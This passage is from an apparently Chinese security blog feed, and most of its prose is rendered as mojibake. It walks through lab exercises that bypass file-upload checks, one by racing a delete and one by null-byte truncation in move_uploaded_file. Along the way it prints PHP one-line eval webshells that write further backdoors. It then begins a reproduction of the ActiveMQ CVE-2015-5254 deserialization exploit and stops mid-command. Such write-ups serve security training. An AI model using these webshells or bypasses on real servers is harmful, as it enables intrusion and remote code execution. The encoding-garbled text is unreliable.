åˆ°æœåŠ¡å™¨ï¼Œç„¶ååˆ¤æ–­æ–‡ä»¶åç¼€æ˜¯å¦åœ¨ç™½åå•é‡Œï¼Œå¦‚æœåœ¨åˆ™é‡å‘½åï¼Œå¦åˆ™åˆ é™¤ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¸Šä¼ 1.phpåªéœ€è¦åœ¨å®ƒåˆ é™¤ä¹‹å‰è®¿é—®å³å¯ï¼Œå¯ä»¥åˆ©ç”¨burpçš„intruderæ¨¡å—ä¸æ–­ä¸Šä¼ ï¼Œç„¶åæˆ‘ä»¬ä¸æ–­çš„è®¿é—®åˆ·æ–°è¯¥åœ°å€å³å¯</p><p>å‡å¦‚æˆ‘ä¸æ–­å‘åŒ…ï¼Œåœ¨åˆ é™¤å‡½æ•°è¿˜æ²¡æ‰§è¡Œå‰ï¼Œæˆ‘ä»¬å·²ç»å…ˆæŠŠé‡Œé¢ä»£ç æ‰§è¡Œå®Œæ¯•äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä¸Šä¼ ä¸€ä¸ªphpï¼Œåœ¨åˆ é™¤ä¹‹å‰å»æ‰§è¡Œï¼Œé€šè¿‡phpä»£ç å†å»å†™ä¸€ä¸ªé©¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $a=<span class="string">'&lt;?php @eval($_REQUEST[\'a\'])?&gt;'</span>;file_put_contents(<span class="string">'1.php'</span>,$a) <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'shell2.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php @eval($_POST["x"])?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆå°†ä¸Šé¢çš„phpä»£ç æ–‡ä»¶ä¸Šä¼ ä¸Šå»ï¼Œå¹¶æŠ“åŒ…</p><p><img src="1.assets/image-20211109104933300.png" alt="image-20211109104933300"></p><p>é€šè¿‡burpçš„çˆ†ç ´æ¨¡å—è¿›è¡Œnull payloadä¸æ–­ä¸Šä¼ </p><p><img src="1.assets/image-20211109103023200.png" alt="image-20211109103023200"></p><p>å¹¶ä¸æ–­è®¿é—®shell.php,é€šè¿‡æ¡ä»¶ç«äº‰åœ¨phpæ–‡ä»¶åœ¨åˆ é™¤ä¹‹å‰ï¼Œæ‰§è¡Œä»£ç ï¼Œä»è€Œç”Ÿæˆæ–°çš„shell</p><p><img src="1.assets/image-20211109102837983.png" alt="image-20211109102837983"></p><p>å‡ºç°200ä¹‹åï¼Œå°±ä»£è¡¨è®¿é—®shell.phpæ˜¯å­˜åœ¨çš„ï¼Œé‚£ä¹ˆ1.phpå¾ˆæœ‰å¯èƒ½å·²ç»åˆ›å»ºï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œå°è¯•è®¿é—®</p><p><img src="1.assets/image-20211109105450848.png" alt="image-20211109105450848"></p><p>æˆåŠŸå†™å…¥</p><h2 id="æ¡ä»¶ç«äº‰ç»•è¿‡2"><a href="#æ¡ä»¶ç«äº‰ç»•è¿‡2" class="headerlink" title="æ¡ä»¶ç«äº‰ç»•è¿‡2"></a>æ¡ä»¶ç«äº‰ç»•è¿‡2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"./myupload.php"</span>);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = <span class="keyword">new</span> MyUpload($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'size'</span>],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> ($status_code) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            $msg = <span class="string">'æ–‡ä»¶å·²ç»è¢«ä¸Šä¼ ï¼Œä½†æ²¡æœ‰é‡å‘½åã€‚'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            $msg = <span class="string">'è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç›®å½•ã€‚'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">            $msg = <span class="string">'ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ ç›®å½•ä¸å¯å†™ã€‚'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">            $msg = <span class="string">'ä¸Šä¼ å¤±è´¥ï¼Œæ— æ³•ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶ã€‚'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">            $msg = <span class="string">'ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ çš„æ–‡ä»¶è¿‡å¤§ã€‚'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-5</span>:</span><br><span class="line">            $msg = <span class="string">'ä¸Šä¼ å¤±è´¥ï¼ŒæœåŠ¡å™¨å·²ç»å­˜åœ¨ç›¸åŒåç§°æ–‡ä»¶ã€‚'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-6</span>:</span><br><span class="line">            $msg = <span class="string">'æ–‡ä»¶æ— æ³•ä¸Šä¼ ï¼Œæ–‡ä»¶ä¸èƒ½å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ã€‚'</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $msg = <span class="string">'æœªçŸ¥é”™è¯¯ï¼'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> $cls_arr_ext_accepted = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">".doc"</span>, <span class="string">".xls"</span>, <span class="string">".txt"</span>, <span class="string">".pdf"</span>, <span class="string">".gif"</span>, <span class="string">".jpg"</span>, <span class="string">".zip"</span>, <span class="string">".rar"</span>, <span class="string">".7z"</span>,<span class="string">".ppt"</span>,</span><br><span class="line">      <span class="string">".html"</span>, <span class="string">".xml"</span>, <span class="string">".tiff"</span>, <span class="string">".jpeg"</span>, <span class="string">".png"</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">( $dir )</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;setDir( $dir );</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">"SUCCESS"</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ¡ä»¶ç«äº‰è¿˜æ˜¯éœ€è¦è¿›è¡Œä»£ç å®¡è®¡</p><p>é€šè¿‡ä»£ç å®¡è®¡å¯ä»¥çŸ¥é“ï¼Œè¿™ä¸€é“é¢˜è¿˜æ˜¯é€šè¿‡å…ˆä¿å­˜ï¼Œç„¶åå†è¿›è¡Œé‡å‘½å</p><p>å› æ­¤ä¹Ÿå­˜åœ¨æ¡ä»¶ç«äº‰çš„é—®é¢˜ï¼Œä¸è¿‡è¿™é¢˜å¯¹æ–‡ä»¶åç¼€ååšäº†ç™½åå•åˆ¤æ–­æ ¡éªŒåç¼€åï¼Œç„¶åä¼šä¸€æ­¥ä¸€æ­¥æ£€æŸ¥æ–‡ä»¶å¤§å°ã€æ–‡ä»¶æ˜¯å¦å­˜åœ¨ç­‰ç­‰ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ä¸æ–­ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œç”±äºæ¡ä»¶ç«äº‰å¯èƒ½æ¥ä¸åŠé‡å‘½åï¼Œä»è€Œä¸Šä¼ æˆåŠŸã€‚</p><h2 id="move-uploaded-fileæˆªæ–­"><a href="#move-uploaded-fileæˆªæ–­" class="headerlink" title="move_uploaded_fileæˆªæ–­"></a>move_uploaded_fileæˆªæ–­</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="1.assets/image-20211110191823095.png" alt="image-20211110191823095"></p><p>è¿™é‡Œæ˜¯ä¸€ä¸ªmove_uploaded_fileçš„ä¸€ä¸ªæˆªæ–­ï¼Œmove_uploaded_fileå‡½æ•°æ˜¯ä¸€ä¸ªç§»åŠ¨ä¸´æ—¶æ–‡ä»¶è·¯å¾„çš„å‡½æ•°ï¼Œä¸€èˆ¬ç”¨æ¥å°†å­˜æ”¾äºä¸´æ—¶ç›®å½•çš„ä¸Šä¼ æ–‡ä»¶ç§»åŠ¨åˆ°æŒ‡å®šç›®å½•ä¸Šå»ï¼›è¿™é‡Œå¯ä»¥çœ‹åˆ°ä¸Šä¼ åŠŸèƒ½ç‚¹æ˜¯å¯ä»¥è‡ªå®šä¹‰æ–‡ä»¶åçš„ï¼Œæˆ‘ä»¬å…ˆä¸Šä¼ ä¸€ä¸ªæ™®é€šå›¾ç‰‡ï¼Œæ¥çœ‹çœ‹å›¾ç‰‡ç§»åŠ¨åçš„ä½ç½®ï¼š</p><p><img src="1.assets/image-20211110192052865.png" alt="image-20211110192052865"></p><p>å¯ä»¥å‘ç°ä»–æŠŠå›¾ç‰‡ç§»åŠ¨åˆ°ä¸Šä¸€çº§çš„uploadæ–‡ä»¶ä¸Šå»äº†ï¼Œä½†å¹¶æ²¡æœ‰é‡å‘½åï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶å®ƒçš„æ–‡ä»¶åï¼Œé‚£æˆ‘ä»¬æ˜¯å¦èƒ½é€šè¿‡è¿›è¡Œæˆªæ–­ç»•è¿‡ï¼š</p><p>å…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼š</p><p><img src="1.assets/image-20211110192151009.png" alt="image-20211110192151009"></p><p>ä¸Šä¼ å¹¶æŠ“åŒ…</p><p><img src="1.assets/image-20211110192345753.png" alt="image-20211110192345753"></p><p><img src="1.assets/image-20211110192521626.png" alt="image-20211110192521626"></p><p>å¯¹æ–‡ä»¶åè¿›è¡Œæˆªæ–­ï¼š</p><p><img src="1.assets/image-20211110193350535.png" alt="image-20211110193350535"></p><p>ä¿®æ”¹åå…­è¿›åˆ¶ä¸º00è¿›è¡Œæˆªæ–­</p><p><img src="1.assets/image-20211110193507087.png" alt="image-20211110193507087"></p><p>å‘åŒ…ï¼ŒæˆåŠŸä¸Šä¼ </p><p><img src="1.assets/image-20211110193548032.png" alt="image-20211110193548032"></p><p><img src="1.assets/image-20211110193653949.png" alt="image-20211110193653949"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/09/26/ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/09/26/ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h3><p>Apache ActiveMQæ˜¯é˜¿å¸•å¥‡ï¼ˆApacheï¼‰è½¯ä»¶åŸºé‡‘ä¼šçš„ä¸€æ¬¾JAVAå¼€æºæ¶ˆæ¯ä¸­é—´ä»¶ï¼Œæ”¯æŒJavaæ¶ˆæ¯æœåŠ¡ã€é›†ç¾¤ã€SpringFramewordç­‰ã€‚å±äºæ¶ˆæ¯é˜Ÿåˆ—ç»„ä»¶(<em>æ¶ˆæ¯é˜Ÿåˆ—ç»„ä»¶ï¼šåˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„é‡è¦ç»„ä»¶ï¼Œä¸»è¦è§£å†³åº”ç”¨è€¦åˆã€å¼‚æ­¥æ¶ˆæ¯ã€æµé‡å‰Šå³°ç­‰</em>)ã€‚</p><h3 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>Apache ActiveMQ 5.13.0ä¹‹å‰5.xç‰ˆæœ¬ä¸­å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œè¯¥æ¼æ´æºäºç¨‹åºæœªèƒ½é™åˆ¶å¯åœ¨ä»£ç†ä¸­åºåˆ—åŒ–çš„ç±»ã€‚è¿œç¨‹æ”»å‡»è€…å¯å€ŸåŠ©ç‰¹åˆ¶çš„åºåˆ—åŒ–çš„Java Message Service (JMS) ObjectMessageå¯¹è±¡åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><h3 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h3><p>Apache ActiveMQ &lt; 5.x</p><h3 id="åˆ©ç”¨é™åˆ¶"><a href="#åˆ©ç”¨é™åˆ¶" class="headerlink" title="åˆ©ç”¨é™åˆ¶"></a>åˆ©ç”¨é™åˆ¶</h3><ul><li>ç‰ˆæœ¬ç¬¦åˆ</li><li>ç«‹å³æ‰§è¡Œä»£ç ï¼šèƒ½å¤Ÿé€šè¿‡å¼±å¯†ç <u>ç™»å½•æŸ¥çœ‹æ¶ˆæ¯é˜Ÿåˆ—</u></li><li>æ²¡æœ‰æŸ¥çœ‹é˜Ÿåˆ—æ‰€æœ‰æ¶ˆæ¯çš„ç”¨æˆ·åå’Œå¯†ç ä¸‹ï¼Œåªèƒ½ç®¡ç†å‘˜/ç”¨æˆ·å»ç‚¹å‡»æˆ‘ä»¬æ’å…¥çš„æ¶ˆæ¯æ‰èƒ½è§¦å‘ï¼ˆæ¯”è¾ƒé¸¡è‚‹ï¼Œä½†å¯ä»¥å†™å…¥åˆ›å»ºç”¨æˆ·å‘½ä»¤ç­‰å¾…ç®¡ç†å‘˜ç‚¹å‡»æŸ¥çœ‹ï¼Œæ¦‚ç‡å¾ˆå¤§ï¼ï¼‰</li></ul><h3 id="æ¼æ´æµ‹è¯•ç¯å¢ƒ"><a href="#æ¼æ´æµ‹è¯•ç¯å¢ƒ" class="headerlink" title="æ¼æ´æµ‹è¯•ç¯å¢ƒ"></a>æ¼æ´æµ‹è¯•ç¯å¢ƒ</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unzip vulhub-master.zip</span><br><span class="line">cd vulhub-master</span><br><span class="line"># è¿›å…¥æŸä¸€ä¸ªæ¼æ´/ç¯å¢ƒçš„ç›®å½•</span><br><span class="line"> cd   activemq/CVE-2015-5254/</span><br><span class="line"># è‡ªåŠ¨åŒ–ç¼–è¯‘ç¯å¢ƒ</span><br><span class="line">docker-compose build</span><br></pre></td></tr></table></figure><p>è¿è¡Œæ¼æ´ç¯å¢ƒï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>ç¯å¢ƒè¿è¡Œåï¼Œå°†ç›‘å¬61616å’Œ8161ä¸¤ä¸ªç«¯å£</p><p>å…¶ä¸­61616æ˜¯å·¥ä½œç«¯å£ï¼Œæ¶ˆæ¯åœ¨è¿™ä¸ªç«¯å£è¿›è¡Œä¼ é€’;</p><p>8161æ˜¯ç½‘ç»œç®¡ç†é¡µé¢ç«¯å£è®¿é—®<a href="http://your-ip:8161å³å¯çœ‹åˆ°ç½‘ç»œç®¡ç†é¡µé¢ï¼Œä¸è¿‡è¿™ä¸ªæ¼æ´ç†è®ºä¸Šæ˜¯ä¸éœ€è¦8161ç®¡ç†ç«¯å£ã€‚" target="_blank" rel="noopener">http://your-ip:8161å³å¯çœ‹åˆ°ç½‘ç»œç®¡ç†é¡µé¢ï¼Œä¸è¿‡è¿™ä¸ªæ¼æ´ç†è®ºä¸Šæ˜¯ä¸éœ€è¦8161ç®¡ç†ç«¯å£ã€‚</a></p><p>ä½¿ç”¨æµè§ˆå™¨ç›´æ¥è®¿é—®activemqï¼ŒæŸ¥çœ‹æ˜¯å¦éƒ¨ç½²å®Œæ¯•</p><p><a href="http://your-ip:8161/admin" target="_blank" rel="noopener">http://your-ip:8161/admin</a> é»˜è®¤å¯†ç (admin/admin)</p><p><img src="C:\Users\allblue\AppData\Roaming\Typora\typora-user-images\image-20210926224910779.png" alt="image-20210926224910779"></p><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>1.æ¼æ´åˆ©ç”¨è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p>a.æ„é€ ï¼ˆå¯ä»¥ä½¿ç”¨ysoserialï¼‰å¯æ‰§è¡Œå‘½ä»¤çš„åºåˆ—åŒ–å¯¹è±¡</p><p>b.ä½œä¸ºä¸€ä¸ªæ¶ˆæ¯ï¼Œå‘é€ç»™ç›®æ ‡61616ç«¯å£</p><p>c.è®¿é—®çš„Webç®¡ç†é¡µé¢ï¼Œè¯»å–æ¶ˆæ¯ï¼Œè§¦å‘æ¼æ´</p><p>2.ä½¿ç”¨jmetè¿›è¡Œæ¼æ´åˆ©ç”¨:</p><p>é¦–å…ˆåœ¨æ”»å‡»æœºä¸‹è½½jmetçš„jaræ–‡ä»¶ï¼Œå¹¶åœ¨åŒç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªexternalæ–‡ä»¶å¤¹ï¼ˆå¦åˆ™å¯èƒ½ä¼šçˆ†æ–‡ä»¶å¤¹ä¸å­˜åœ¨çš„é”™è¯¯ï¼‰ã€‚jmetåŸç†æ˜¯ä½¿ç”¨ysoserialç”ŸæˆPayloadå¹¶å‘é€ï¼ˆå…¶jarå†…è‡ªå¸¦ysoserialï¼Œæ— éœ€å†è‡ªå·±ä¸‹è½½ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ysoserialæ˜¯gadgetä¸­é€‰æ‹©ä¸€ä¸ªå¯ä»¥ä½¿ç”¨çš„ï¼Œæ¯”å¦‚ROMEã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">wget 